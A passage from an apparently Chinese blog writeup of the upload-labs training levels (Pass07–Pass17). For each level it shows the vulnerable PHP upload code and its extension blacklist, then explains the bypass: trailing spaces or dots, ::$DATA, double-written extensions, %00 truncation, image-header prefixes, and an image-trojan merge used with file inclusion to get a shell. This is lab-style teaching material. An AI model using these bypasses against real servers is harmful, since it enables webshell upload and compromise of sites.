class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>黑名单校验不严，后缀大小写绕过。<br><img src="/2020/01/05/upload-labs-writeup/upload-lab5.png" alt="upload-lab5"></p>
<h2 id="Pass07"><a href="#Pass07" class="headerlink" title="Pass07"></a>Pass07</h2><p>黑名单校验不严，导致可结合Windows系统特性 空格<code> </code>绕过。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>,<span class="string">".ini"</span>);</div><div class="line">$file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</div><div class="line">$file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></div><div class="line">$file_ext = strrchr($file_name, <span class="string">'.'</span>);</div><div class="line">$file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></div><div class="line">$file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</div><div class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">    $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</div><div class="line">    <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</div><div class="line">        $is_upload = <span class="keyword">true</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $msg = <span class="string">'上传出错！'</span>;</div><div class="line">    &#125;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    $msg = <span class="string">'此文件不允许上传'</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>黑名单校验不严，后缀加<code>空格</code>绕过.</p>
<p>利用windows 特性(windows文件名后缀不允许存在空格，如果存在，windows自动去除空格)<code>空格</code>绕过。</p>
<p>上传文件名1.php空格 -&gt;php空格不在黑名单内，正常上传-&gt;windows发现写入的文件名有空格，自动去除空格-&gt;最后在磁盘上的文件名 就变成了1.php</p>
<p><img src="/2020/01/05/upload-labs-writeup/upload-lab6.png" alt="upload-lab6"></p>
<h2 id="Pass08"><a href="#Pass08" class="headerlink" title="Pass08"></a>Pass08</h2><p>黑名单校验不严，导致可结合Windows系统特性点<code>.</code>绕过。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>,<span class="string">".ini"</span>);</div><div class="line">$file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</div><div class="line">$file_ext = strrchr($file_name, <span class="string">'.'</span>);</div><div class="line">$file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></div><div class="line">$file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></div><div class="line">$file_ext = trim($file_ext); <span class="comment">//首尾去空</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</div><div class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">    $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</div><div class="line">    <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</div><div class="line">        $is_upload = <span class="keyword">true</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $msg = <span class="string">'上传出错！'</span>;</div><div class="line">    &#125;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    $msg = <span class="string">'此文件类型不允许上传！'</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>黑名单校验不严，后缀加<code>.</code>绕过.</p>
<p>利用windows特性(windows文件名后缀不允许存在<code>.</code>，如果存在，windows自动去除)<code>.</code>绕过。</p>
<p><img src="/2020/01/05/upload-labs-writeup/upload-lab7.png" alt="upload-lab7"></p>
<h2 id="Pass09"><a href="#Pass09" class="headerlink" title="Pass09"></a>Pass09</h2><p>黑名单校验不严，导致可结合Windows系统特性<code>::$DATA</code>绕过。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>,<span class="string">".ini"</span>);</div><div class="line">$file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</div><div class="line">$file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></div><div class="line">$file_ext = strrchr($file_name, <span class="string">'.'</span>);</div><div class="line">$file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></div><div class="line">$file_ext = trim($file_ext); <span class="comment">//首尾去空</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</div><div class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">    $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</div><div class="line">    <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</div><div class="line">        $is_upload = <span class="keyword">true</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $msg = <span class="string">'上传出错！'</span>;</div><div class="line">    &#125;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    $msg = <span class="string">'此文件类型不允许上传！'</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>黑名单校验不严，后缀加<code>::$DATA</code>绕过</p>
<p><img src="/2020/01/05/upload-labs-writeup/upload-lab8.png" alt="upload-lab8"></p>
<p>利用windows特性<code>::$DATA</code>绕过。<br>DATA是NTFS文件系统的存储数据流的默认属性。</p>
<p>当访问1.php::$DATA时，就是请求1.php本身的数据。</p>
<p><img src="/2020/01/05/upload-labs-writeup/upload-lab8-01.png" alt="upload-lab8-01"></p>
<h2 id="Pass10"><a href="#Pass10" class="headerlink" title="Pass10"></a>Pass10</h2><p>黑名单校验不严，导致可结合Windows系统特性<code>.</code>绕过。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>,<span class="string">".ini"</span>);</div><div class="line">$file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</div><div class="line">$file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></div><div class="line">$file_ext = strrchr($file_name, <span class="string">'.'</span>);</div><div class="line">$file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></div><div class="line">$file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></div><div class="line">$file_ext = trim($file_ext); <span class="comment">//首尾去空</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</div><div class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">    $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</div><div class="line">    <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</div><div class="line">        $is_upload = <span class="keyword">true</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $msg = <span class="string">'上传出错！'</span>;</div><div class="line">    &#125;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    $msg = <span class="string">'此文件类型不允许上传！'</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>黑名单校验不严，导致<code>php.php. .</code>绕过。</p>
<p>代码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</div><div class="line">$file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></div><div class="line">$file_ext = strrchr($file_name, <span class="string">'.'</span>);</div><div class="line">$file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></div><div class="line">$file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></div><div class="line">$file_ext = trim($file_ext); <span class="comment">//首尾去空</span></div></pre></td></tr></table></figure></p>
<p><code>php.php.空格.</code> -&gt; 删除文件名末尾的点,变为<code>php.php.空格</code>-&gt; 首尾去空，变为<code>php.php.</code>-&gt;<code>php.</code>后缀不在黑名单内，绕过黑名单验证-&gt;Windows发现文件名最后有<code>.</code>，自动去除 -&gt; 最终磁盘上的文件名为<code>php.php</code></p>
<p><img src="/2020/01/05/upload-labs-writeup/upload-lab9.png" alt="upload-lab9"></p>
<h2 id="Pass11"><a href="#Pass11" class="headerlink" title="Pass11"></a>Pass11</h2><p>黑名单过滤，只过滤一次，因此双写<code>pphphp</code>绕过。</p>
<p>代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</div></pre></td></tr></table></figure></p>
<p>pphphp -&gt; 过滤后为p<del>php</del>hp，前后又拼成了一个php。</p>
<p><img src="/2020/01/05/upload-labs-writeup/upload-lab10.png" alt="upload-lab10"></p>
<h2 id="Pass12"><a href="#Pass12" class="headerlink" title="Pass12"></a>Pass12</h2><p>代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</div><div class="line">    $is_upload = <span class="keyword">true</span>;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    $msg = <span class="string">'上传出错！'</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>save_path</code> 保存路径参数可控，Get参数，直接%00 截断，中间件Apache接收到请求后会将%00解码一次，也就变成了空字节,在内存中 一段字符串的结束通常以空字节标识，空字节后面的数据也就被截断了，因此$img_path=<code>../upload/lxhsec.php</code></p>
<p><img src="/2020/01/05/upload-labs-writeup/upload-lab11.png" alt="upload-lab11"></p>
<h2 id="Pass13"><a href="#Pass13" class="headerlink" title="Pass13"></a>Pass13</h2><p>代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$img_path = $_POST[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</div><div class="line">    $is_upload = <span class="keyword">true</span>;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    $msg = <span class="string">"上传失败"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>save_path</code> 保存路径参数可控，因为是POST参数，在取save_path值的时候，中间件Apache并不会自动解码一次，因此需要自己手动将%00解码一次。</p>
<p><img src="/2020/01/05/upload-labs-writeup/upload-lab12.png" alt="upload-lab12"></p>
<h2 id="Pass14"><a href="#Pass14" class="headerlink" title="Pass14"></a>Pass14</h2><p>判断文件内容前两个字节是否是图片前缀。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span><span class="params">($filename)</span></span>&#123;</div><div class="line">    $file = fopen($filename, <span class="string">"rb"</span>);</div><div class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//只读2字节</span></div><div class="line">    fclose($file);</div><div class="line">    $strInfo = @unpack(<span class="string">"C2chars"</span>, $bin);    </div><div class="line">    $typeCode = intval($strInfo[<span class="string">'chars1'</span>].$strInfo[<span class="string">'chars2'</span>]);    </div><div class="line">    $fileType = <span class="string">''</span>;    </div><div class="line">    <span class="keyword">switch</span>($typeCode)&#123;      </div><div class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </div><div class="line">            $fileType = <span class="string">'jpg'</span>;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </div><div class="line">            $fileType = <span class="string">'png'</span>;</div><div class="line">            <span class="keyword">break</span>;        </div><div class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </div><div class="line">            $fileType = <span class="string">'gif'</span>;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">default</span>:            </div><div class="line">            $fileType = <span class="string">'unknown'</span>;</div><div class="line">        &#125;    </div><div class="line">        <span class="keyword">return</span> $fileType;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$is_upload = <span class="keyword">false</span>;</div><div class="line">$msg = <span class="keyword">null</span>;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</div><div class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">    $file_type = getReailFileType($temp_file);</div><div class="line"></div><div class="line">    <span class="keyword">if</span>($file_type == <span class="string">'unknown'</span>)&#123;</div><div class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_type;</div><div class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</div><div class="line">            $is_upload = <span class="keyword">true</span>;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            $msg = <span class="string">"上传出错！"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>因此解法1，添加图片前缀，例如gif 前缀 <code>GIF89a</code><br><img src="/2020/01/05/upload-labs-writeup/upload-lab13-01.png" alt="upload-lab13-01"></p>
<p>然后利用文件包含 getshell。<br><code>include.php?file=upload/3620200111182701.gif</code></p>
<p>解法2，制作图片木马。<br><code>copy test.png/b+1.php/a 3.png</code></p>
<p>test.png：随便一个png格式图片<br>1.php: 你的php代码<br>3.png: 合并之后的图片</p>
<p>3.png用文本编辑器打开，可以看到1.php的内容：<br><img src="/2020/01/05/upload-labs-writeup/upload-lab13-02.png" alt="upload-lab13-02"></p>
<p>上传3.png,<br>访问，可以看见图片被解析为脚本语言。<br><img src="/2020/01/05/upload-labs-writeup/upload-lab13-03.png" alt="upload-lab13-03"></p>
<h2 id="Pass15"><a href="#Pass15" class="headerlink" title="Pass15"></a>Pass15</h2><p>getimagesize</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</div><div class="line">    $types = <span class="string">'.jpeg|.png|.gif'</span>;</div><div class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</div><div class="line">        $info = getimagesize($filename);</div><div class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</div><div class="line">        <span class="keyword">if</span>(stripos($types,$ext)&gt;=<span class="number">0</span>)&#123;</div><div class="line">            <span class="keyword">return</span> $ext;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>与十三关解法相同。</p>
<p>用1解法即可。</p>
<h2 id="Pass16"><a href="#Pass16" class="headerlink" title="Pass16"></a>Pass16</h2><p>exif_imagetype</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</div><div class="line">    <span class="comment">//需要开启php_exif模块</span></div><div class="line">    $image_type = exif_imagetype($filename);</div><div class="line">    <span class="keyword">switch</span> ($image_type) &#123;</div><div class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</div><div class="line">            <span class="keyword">return</span> <span class="string">"gif"</span>;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</div><div class="line">            <span class="keyword">return</span> <span class="string">"jpg"</span>;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</div><div class="line">            <span class="keyword">return</span> <span class="string">"png"</span>;</div><div class="line">            <span class="keyword">break</span>;    </div><div class="line">        <span class="keyword">default</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>与十三关解法相同。</p>
<p>用1解法即可。</p>
<h2 id="Pass17"><a href="#Pass17" class="headerlink" title="Pass17"></a>Pass17</h2><p>代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div></pre></td><td class="code"><pre><div class="line">$is_upload = <span class="keyword">false</span>;</div><div class="line">$msg = <span class="keyword">null</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</div><div class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></div><div class="line">    $filename = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</div><div class="line">    $filetype = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>];</div><div class="line">    $tmpname = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</div><div class="line"></div><div class="line">    $target_path=UPLOAD_PATH.<span class="string">'/'</span>.basename($filename);</div><div class="line"></div><div class="line">    <span class="comment">// 获得上传文件的扩展名</span></div><div class="line">    $fileext= substr(strrchr($filename,<span class="string">"."</span>),<span class="number">1</span>);</div><div class="line"></div><div class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></div><div class="line">    <span class="keyword">if</span>(($fileext == <span class="string">"jpg"</span>) &amp;&amp; ($filetype==<span class="string">"image/jpeg"</span>))&#123;</div><div class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</div><div class="line">            <span class="comment">//使用上传的图片生成新的图片</span></div><div class="line">            $im = imagecreatefromjpeg($target_path);</div><div class="line"></div><div class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</div><div class="line">                $msg = <span class="string">"该文件不是jpg格式的图片！"</span>;</div><div class="line">                @unlink($target_path);</div><div class="line">            &#125;<span class="keyword">else</span>&#123;</div><div class="line">                <span 